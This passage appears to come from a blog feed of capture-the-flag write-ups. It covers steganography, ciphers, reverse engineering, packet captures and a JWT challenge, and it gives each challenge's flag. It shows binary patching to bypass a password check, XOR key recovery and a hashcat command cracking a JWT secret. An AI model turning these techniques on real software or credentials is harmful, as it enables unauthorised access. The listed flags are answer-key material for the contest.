+Sure! Below is a Python script that reads a CSV file representing a 29x29 black and white image and converts it into an image using the `Pillow` library. The assumption is that values in the CSV represent pixel intensities (0 for black, 255 for white):
+
+&#92;```python
+import csv
+from PIL import Image
+import numpy as np
+
+# Load the CSV file
+csv_file = &#39;your_file.csv&#39;  # Replace with your CSV file path
+output_image = &#39;output_image.png&#39;  # Replace with desired output image name
+
+# Read the CSV file
+with open(csv_file, newline=&#39;&#39;) as f:
+    reader = csv.reader(f)
+    data = list(reader)
+
+# Convert the CSV data to a numpy array
+image_data = np.array(data, dtype=np.uint8)
+
+# Reshape into a 29x29 array
+image_data = image_data.reshape((29, 29))
+
+# Create an image from the numpy array
+image = Image.fromarray(image_data)
+
+# Save the image
+image.save(output_image)
+image.show()
+&#92;```
+
+### Key Points:
+
+- The script reads the CSV, converts it to a NumPy array, and reshapes it into a 29x29 grid.
+- It assumes that the values are already in the form of pixel intensities (0 for black and 255 for white).
+- You can replace the CSV file path with your actual file&#39;s name.
+
+Let me know if you need any further customization!
+
+
+This almost works perfectly, but needed to flip it in an image editor because the reshape was kind of weird. In the end we get &amp;quot;flag{that_will_be_five_dollars}&amp;quot;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h2 id=&quot;syncopated-beat&quot;&gt;Syncopated Beat &lt;a class=&quot;direct-link&quot; href=&quot;#syncopated-beat&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;
+&lt;p&gt;Category: Steg&lt;/p&gt;
+&lt;p&gt;Challenge lists something about demon voices and includes a video, listen to video and you will hear reversed speech partway in the song, classic. Reversing audio in audacity gives us the voices (very good quality audio too)&lt;/p&gt;
+&lt;p&gt;The silly &amp;quot;demon&amp;quot; gives a hint that the flag is a band that did a song like &amp;quot;fly like an eagle, time keeps on slipping&amp;quot; in the 70s with all cap, spaces between the words (good song). The band is STEVE MILLER BAND&lt;/p&gt;
+&lt;h2 id=&quot;logical-left-and-rational-right&quot;&gt;Logical Left and Rational Right &lt;a class=&quot;direct-link&quot; href=&quot;#logical-left-and-rational-right&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;
+&lt;p&gt;Challenge is a file with a bunch of &#92; and /. Very binary looking&lt;/p&gt;
+&lt;p&gt;Used cyberchef&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;Find_/_Replace({&#39;option&#39;:&#39;Regex&#39;,&#39;string&#39;:&#39;&#92;&#92;&#92;&#92;&#39;},&#39;0&#39;,true,false,true,false)
+Find_/_Replace({&#39;option&#39;:&#39;Regex&#39;,&#39;string&#39;:&#39;&#92;&#92;/&#39;},&#39;1&#39;,true,false,true,false)
+From_Binary(&#39;Space&#39;,8)
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Gives us &amp;quot;Just a little something to get started, hope you have fun this year Turbo Tacky!!!! flag{H3YY0UrF1N411Y4W4K3}&amp;quot;&lt;/p&gt;
+&lt;h2 id=&quot;ides-le-talk&quot;&gt;Ides-le Talk &lt;a class=&quot;direct-link&quot; href=&quot;#ides-le-talk&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;
+&lt;p&gt;Challenge is a txt file with text like &amp;quot;Gur Yvsr naq Qrngu bs Whyvhf Pnrfne.&amp;quot; The patterns look a lot like a monoalphabetic substitution cipher, particularly a rotation so tested it versus rot13 in cyberchef and we get &amp;quot;The Life and Death of Julius Caesar.&#39; Ctrl-F for &amp;quot;flag&amp;quot; and we find &amp;quot;flag: L3t_The#Mi$chiefs^8361n&amp;quot;&lt;/p&gt;
+&lt;h2 id=&quot;social-pressure&quot;&gt;Social Pressure &lt;a class=&quot;direct-link&quot; href=&quot;#social-pressure&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;
+&lt;p&gt;Similar challenge to Ides-le but this time ROT13 Bruteforcing didnt work example text: &amp;quot;Svb ororgs, yrt mvdh! Dv&#39;iv tlrmt zugvi Wv Nlmmv Urmzmxrzo mvcg. Gsvri hvxfirgb nvzhfivh szev hlnv slovh gszg dv&#39;iv tlmmz vckolrg yrt grnv! R&#39;ev yvvm klprmt zilfmw zmw ulfmw hlnv HJO efomvizyrorgrvh dv xzm oveviztv uli nzcrnfn xszlh.&amp;quot;&lt;/p&gt;
+&lt;p&gt;Since ROT13 didn&#39;t work I shoved it in dcode&#39;s monoalphabetic substitution cipher solver (&lt;a href=&quot;https://www.dcode.fr/monoalphabetic-substitution&quot;&gt;https://www.dcode.fr/monoalphabetic-substitution&lt;/a&gt;). This gives us &amp;quot;HEY LILITH, BIG NEWS! WE&#39;RE GOING AFTER DE MONNE FINANCIAL NEXT. THEIR SECURITY MEASURES HAVE SOME HOLES THAT WE&#39;RE GONNA EXPLOIT BIG TIME! I&#39;VE BEEN POKING AROUND AND FOUND SOME SQL VULNERABILITIES WE CAN LEVERAGE FOR MAXIMUM CHAOS.&amp;quot; and two potential keys (ZYXWVUTSRAPONMLKJIHGFEDCBQ or JYXWVUTSRQPONMLKZIHGFEDCBA). Using these we can decrypt their chats and find that they are talking about &amp;quot;Elroy Ongaro&amp;quot; so the flag is &amp;quot;flag{Elroy_Ongaro}&lt;/p&gt;
+&lt;h2 id=&quot;cereal-killer-01&quot;&gt;Cereal Killer 01 &lt;a class=&quot;direct-link&quot; href=&quot;#cereal-killer-01&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;
+&lt;p&gt;Using IDA to decompile the windows code we get something like&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;  sub_791020(&amp;quot;As in, which spooky cereal is best?&#92;n&amp;quot;, v27);
+  sub_791020(&amp;quot;Mr. Robert F. Kennedy, Jr. has a favorite spooky cereal.  Tear apart this&#92;n&amp;quot;, v28);
+  sub_791020(&amp;quot;binary and see if you can figure out what it is!&#92;n&amp;quot;, v29);
+  sub_791020(&amp;quot;&#92;n&#92;n&amp;quot;, v30);
+  sub_791020(&amp;quot;Please enter the password: &amp;quot;, v31);
+  sub_791060(&amp;quot;%1023[^&#92;n]&amp;quot;, (char)Src);
+  v8 = Src;
+  for ( j = strlen(Src); isspace(ArgList[j + 47]); Src[j] = 0 )
+    --j;
+  for ( k = Src[0]; k; --j )
+  {
+    if ( !isspace(k) )
+      break;
+    k = *++v8;
+  }
+  memmove(Src, v8, j + 1);
+  sub_7910A0(13);
+  if ( !strncmp(Str1, &amp;quot;obboreel&amp;quot;, 8u) )
+  {
+    v24 = &amp;quot;ACCESS DENIED!!!&#92;n&amp;quot;;
+  }
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;so I tried &amp;quot;obboreel&amp;quot; as the password. That didn&#39;t work, so I did it again and looked to see what it was comparing for the strncmp. In this stack we could see &amp;quot;booberry&amp;quot; so I used that and it worked and spat out the flag&lt;/p&gt;
+&lt;h2 id=&quot;she&#39;s-got-issues&quot;&gt;She&#39;s Got Issues &lt;a class=&quot;direct-link&quot; href=&quot;#she&#39;s-got-issues&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;
+&lt;p&gt;&amp;quot;Head over to their code repo and see if you can gather some intel on the state of the develop team and other clues that might help you hack the Sweepstakes website.&amp;quot;&lt;br&gt;
+Click repo, check issues tab, ctrl-f &amp;quot;flag&amp;quot;, flag{CK06b-What-The-Director-Wants-The-Director-Gets!!!}&lt;/p&gt;
+&lt;h2 id=&quot;image-of-the-beast&quot;&gt;Image of the Beast &lt;a class=&quot;direct-link&quot; href=&quot;#image-of-the-beast&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;
+&lt;p&gt;Some sorta lore about a disgruntled employee, he left something for us in a repo. Link to a github. Click link to github, find image by the disgruntled employee, look at exif data &amp;quot;WebStatement	&lt;a href=&quot;https://schnickschnock.lyttonlabs.org/schnickschnock/welp.html&quot;&gt;https://schnickschnock.lyttonlabs.org/schnickschnock/welp.html&lt;/a&gt;&amp;quot; Flag at the bottom of page &amp;quot;flag{CK06a-Clippy-Isnt-Disgruntled-He-Was-Never-Gruntled-In-The-First-Place!!!}&amp;quot;&lt;/p&gt;
+&lt;h2 id=&quot;cereal-killer-05&quot;&gt;Cereal Killer 05 &lt;a class=&quot;direct-link&quot; href=&quot;#cereal-killer-05&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;
+&lt;p&gt;Use a java decompiler to decompile the code, notice it uses an incrementing xor cipher to decrypt the url with our supplied cipher and that the plaintext url starts with &amp;quot;https://&#39;. Use the reversibility of xor with known plaintext as such:&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;encrypted_url=[42, 6, 68, 64, 7, 120, 93, 31, 83, 17, 48, 23, 81, 92, 90, 46, 11, 68, 68, 27, 44, 30, 81, 82, 7, 108, 29, 66, 87, 91, 33, 23, 66, 85, 21, 46, 1, 31, 86, 6, 45, 29, 68, 82, 6, 45, 29, 68, 30, 30, 50, 23, 87]
+for i in range(len(&amp;quot;https://&amp;quot;)): print(chr(encrypted_url[i]^ord(&amp;quot;https://&amp;quot;[i])),end=&#39;&#39;)
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;This gives us &amp;quot;Br00tBr0&#39;&lt;br&gt;
+but we happen to know there is a modulus in the code so the key is reused, so we can assume the key is actually just &amp;quot;Br00t&amp;quot;&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;C:&#92;Users&#92;Cramik&#92;Desktop&amp;gt;java -jar cerealkiller05.jar
+President Donald Trump has a favorite cereal.  It is great... really great...
+The reason it is so great, is because HE likes it... that makes it reall great...
+Of course, to maintain utmost secrecy, it is protected with a password that is
+HIGHLY secure (and backed up securely on a piece of paper somewhere in Mar Lago...)
+Now, you, being a highly trained hacker, should be able to BYPASS this security and
+discover what President Trump&#39;s favorite monster cereal is.
+
+Enter password: Br00t
+Decrypted URL: https://cereal.lyttonlabs.org/cereals/frootbroot.jpeg
+Decrypted Flag: flag{Fr00t-Br00t-is-the-only-cereal-for-Prez-Trump!}
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h2 id=&quot;cereal-killer-02&quot;&gt;Cereal Killer 02 &lt;a class=&quot;direct-link&quot; href=&quot;#cereal-killer-02&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;
+&lt;p&gt;I played around with inputs and noticed that the access denied output is hit when a DWORD (labelled v9 by IDA) fails an if comparison with another DWORD (v11). I also noticed that v11 is independent of our input so its likely the intended result of our input. With this, I patched the assembly above that sets&lt;br&gt;
+&amp;quot;v9 = &amp;amp;v44;&amp;quot; to the equivalent of &amp;quot;v9 = &amp;amp;v45;&amp;quot; since v11 is set to &amp;amp;v45 right before the comparison&lt;br&gt;
+basically turned&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;.text:00FE1435 lea     ecx, [esp+760h+var_480]
+.text:00FE143C mov     esi, 0Ch
+.text:00FE1441 lea     edx, [esp+760h+var_470]
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;to&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;.text:00FE1435 lea     ecx, [esp+760h+var_470]
+.text:00FE143C mov     esi, 0Ch
+.text:00FE1441 lea     edx, [esp+760h+var_470]
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h2 id=&quot;data-breach&quot;&gt;Data Breach &lt;a class=&quot;direct-link&quot; href=&quot;#data-breach&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;
+&lt;p&gt;Downloaded the pcap file, pcapng so couldn&#39;t use networkminer free version :(. Sorted by protocol, skipped ARP, thought DNS looked suspicious but didnt see anything easy to solve, so went down to HTTP. Noticed an HTTP header &amp;quot;Not-Suppose-To-Be-Here: flag{Information_disclosure_in_the_head}&amp;quot;&lt;/p&gt;
+&lt;h4 id=&quot;(future-me-here.-you-can-just-use-wireshark-to-convert-pcapng-to-pcap)&quot;&gt;(Future me here. You can just use wireshark to convert pcapng to pcap) &lt;a class=&quot;direct-link&quot; href=&quot;#(future-me-here.-you-can-just-use-wireshark-to-convert-pcapng-to-pcap)&quot;&gt;#&lt;/a&gt;&lt;/h4&gt;
+&lt;h2 id=&quot;winning-factors&quot;&gt;Winning Factors &lt;a class=&quot;direct-link&quot; href=&quot;#winning-factors&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;
+&lt;pre&gt;&lt;code&gt;from pwn import *
+from math import factorial
+a=remote(&amp;quot;147.182.245.126&amp;quot;,&amp;quot;33001&amp;quot;);b=a.recvline();print(b);number=b[27:-2];print(number);answer=str(math.factorial(int(number)));print(answer);a.send(answer);b=a.recvall(timeout=1);print(b)
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h2 id=&quot;is-this-vul-ner-ble%3F&quot;&gt;Is This Vul-ner-ble? &lt;a class=&quot;direct-link&quot; href=&quot;#is-this-vul-ner-ble%3F&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;
+&lt;pre&gt;&lt;code&gt;hashcat -m 16500 eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCIsIm5vbmNlIjoiIn0.eyJpc3MiOiJ0dXJib3RhY3RpY2FsLm5ldCIsImV4cCI6IjE0NTA2NTkxMDIiLCJ1cG4iOiJjZm9kZXJhIiwiZnVsbF9uYW1lIjoiQ2xhaXIgRm9kZXJhIiwidXNlcm5hbWUiOiJDRm9kZXJhOTEiLCJwaG9uZV9udW1iZXIiOiIiLCJqdGkiOiJmdGlkMjM0MmEtMzI0M2QtMjM0My1kMzR5OHlnZmZlIiwic3R1ZmYiOjExMjIyLCJncm91cHMiOlsibG93X2FkbWluIiwicmVtb3RlX3VzZXIiLCJsYWJ0ZWNoIl0sIm9yZyI6IlR1cmJvVGFjdGljYWwiLCJzdWJfb3JnIjoiR3JvdXBfRCIsIm5idCI6NTc1NDczNzU0ODI5NTI3NTAwMDAsImxkZV9zIjpbeyJhc3RhdHVzIjoibnVsbCIsImJzdGF0dXMiOiJudWxsIiwiY3N0YXR1cyI6InZhbGlkIiwiZHN0YXR1cyI6Im51bGwifV19.kQKRFPLj_SqVeEiBjfKi7FKOEVoV71JgdFRxDTjp7TQ fasttrack.txt
+&lt;/code&gt;&lt;/pre&gt;
+
+			
+		</content>
+	</entry>
+</feed>
